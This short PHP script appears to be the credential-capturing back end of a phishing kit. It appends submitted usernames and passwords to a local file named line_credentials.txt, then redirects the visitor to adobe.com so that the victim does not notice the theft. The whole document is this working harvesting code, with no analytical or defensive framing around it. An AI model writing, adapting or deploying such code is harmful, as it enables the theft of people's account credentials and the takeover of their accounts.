<?php

file_put_contents("credentials/line_credentials.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://adobe.com');
exit();
